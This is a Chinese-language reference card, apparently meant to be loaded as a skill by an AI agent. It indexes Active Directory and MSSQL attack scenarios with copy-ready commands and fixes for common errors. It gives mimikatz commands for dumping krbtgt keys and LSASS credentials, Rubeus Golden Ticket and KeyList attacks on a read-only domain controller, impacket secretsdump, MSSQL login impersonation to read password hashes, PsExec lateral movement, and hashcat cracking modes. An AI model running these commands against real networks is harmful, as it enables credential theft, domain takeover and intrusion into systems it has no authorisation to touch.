---
name: 'tool-scenario-reference'
description: '按攻击场景索引的精确工具命令，含常见错误和修正。场景→命令：RODC krbtgt_XXXX dump/Golden Ticket/KeyList、MSSQL 模拟登录、PsExec 跳板、Werkzeug 哈希识别。'
whenToUse: '需要某个攻击场景的精确命令（如 dump krbtgt）时'
metadata: { domain: meta, tier: T1 }
---
> 📌 DSH 用法：用 skill 工具按名加载本卡。

## 工具场景精确命令速查

> 使用方式：搜索当前要做的操作（如"dump krbtgt"、"RODC golden ticket"），直接复制命令。

---

### RODC 提权

#### 场景：从 RODC 提取 krbtgt_XXXX 密钥
```cmd
# 在 RODC 的 SYSTEM shell 中执行
mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_XXXX" "exit"
```text
- ✅ 用 `/inject /name:krbtgt_XXXX`（不是 `/patch`）
- ✅ 输出中包含 `aes256_hmac` 行 → 这是 Golden Ticket 的密钥
- ❌ `/patch` 只给 NTLM hash，Golden Ticket 需要 AES256

#### 场景：RODC Golden Ticket（Rubeus）
```cmd
Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /aes256:<AES_KEY> /user:Administrator /id:500 /domain:domain.local /sid:<DOMAIN_SID> /outfile:ticket.kirbi
```text
- ✅ 用 `/aes256:`（不是 `/rc4:`）
- ✅ 用 `/flags:forwardable,renewable,enc_pa_rep`
- ❌ `/rc4:` + 缺少 flags → KDC_ERR_TGT_REVOKED

#### 场景：RODC KeyList Attack（Rubeus）
```cmd
Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/domain.local /dc:DC01.domain.local /ticket:ticket.kirbi /nowrap
```text
- ✅ 用 `/enctype:aes256`
- ✅ 用 `/dc:` 指定可写 DC
- ✅ 用 `/ticket:` 指向 golden ticket 文件
- 输出：`Password Hash: <ADMIN_NTLM>`

#### 场景：RODC KeyList Attack（impacket，从 Kali 直接）
```bash
impacket-secretsdump -use-keylist -rodcNo 8245 -rodcKey <AES_KEY> domain/Administrator@DC_IP
```text
- ✅ 用 AES256 密钥，不是 NTLM

#### 场景：KDC_ERR_TGT_REVOKED
```powershell
# 根因：msDS-NeverRevealGroup 包含目标用户
# 检查：
Get-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=domain,DC=local" -Properties msDS-NeverRevealGroup
# 清除：
Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=domain,DC=local" -Clear msDS-NeverRevealGroup
```text

（完整四步链见 rodc-privesc-chain 卡）

---

### MSSQL 攻击

#### 场景：MSSQL 模拟登录 + 读应用数据库哈希
```sql
-- 枚举可模拟登录
SELECT b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- 模拟
EXECUTE AS LOGIN = 'app_user';
USE AppDatabase;
SELECT username, password_hash FROM users;
REVERT;
```text

#### 场景：识别 Werkzeug PBKDF2 哈希
```text
pbkdf2:sha256:600000$salt$hash  → hashcat -m 10900
```text

（完整链见 mssql-attack-chain 卡）

---

### PsExec 使用

#### 场景：通过 DC 跳板执行命令到内网 RODC
```cmd
# 在 DC 的 shell 中
C:\Windows\Temp\psexec64.exe -accepteula \\<RODC_IP_or_FQDN> -s cmd /c "<command>"
```text
- ✅ `-s` = SYSTEM
- ✅ PsExec 需 ADMIN$ 和 C$ 共享可访问

---

### mimikatz 使用

#### 场景：需要 AES256 密钥（非 NTLM）
```cmd
mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:<target_user>" "exit"
```text
- ✅ `/inject /name:XXX` 给出 AES256
- ❌ `/patch` 只给 NTLM

#### 场景：从 LSASS dump 所有凭据
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```text

---

### Rubeus 使用

| 场景 | 关键参数 |
|------|---------|
| S4U 获取 TGS | `/user:FAKE$ /rc4:HASH /impersonateuser:Admin /msdsspn:cifs/TARGET /ptt` |
| Golden Ticket (普通) | `/rc4:KRBTGT_HASH /user:Admin /id:500 /ptt` |
| Golden Ticket (RODC) | `/aes256:AES_KEY /rodcNumber:N /flags:forwardable,renewable,enc_pa_rep /outfile:ticket.kirbi` |
| asktgs keylist | `/enctype:aes256 /keyList /ticket:FILE /dc:DC_FQDN` |
| DCSync with dMSA TGT | `asktgt /dmsa /aes256:KEY /user:dMSA$ /ptt` |

---

### bloodhound / nxc 常见错误

| 错误 | 原因 | 修正 |
|------|------|------|
| `STATUS_LOGON_FAILURE` | 密码错误或 NTLM 被禁 | 换 Kerberos: `-k -no-pass` |
| `KDC_ERR_TGT_REVOKED` | Golden ticket 被拒 | 检查 msDS-NeverRevealGroup |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | Shadow Credentials 无 CA | 换 RBCD 路径 |
| `SMB SessionError: STATUS_USER_SESSION_DELETED` | 双跳认证失败 | 用 PTT 或直接凭据 |
| nxc winrm 无输出 | 命令输出未被 WinRM 捕获 | 重定向到文件再读 |

---

### 凭据类型识别

| 格式 | 类型 | hashcat mode |
|------|------|-------------|
| `pbkdf2:sha256:N$salt$hash` | Werkzeug PBKDF2 | `-m 10900` |
| `$2a$` / `$2b$` / `$2y$` | bcrypt | `-m 3200` |
| `$6$` | SHA-512 crypt | `-m 1800` |
| `$krb5tgs$23$*` | Kerberoast (RC4) | `-m 13100` |
| `$krb5asrep$23$` | AS-REP | `-m 18200` |
